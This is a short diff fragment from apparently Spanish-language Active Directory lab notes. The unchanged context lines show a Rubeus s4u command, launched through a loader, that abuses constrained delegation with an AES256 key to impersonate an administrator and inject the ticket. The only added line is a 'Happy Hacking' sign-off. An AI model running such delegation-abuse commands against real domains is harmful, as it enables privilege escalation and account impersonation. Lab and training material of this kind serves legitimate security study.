@@ -559,3 +559,5 @@ C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std456
 # A través de AES256
 C:\AD\Tools\Loader.exe -Path C:\AD\Tools\Rubeus.exe -args s4u /user:dcorp-std456$ /aes256:<AES256_KEY> /msdsspn:http/dcorp-ws01 /impersonateuser:administrator /ptt
 ```
+
+> _Happy Hacking :)_
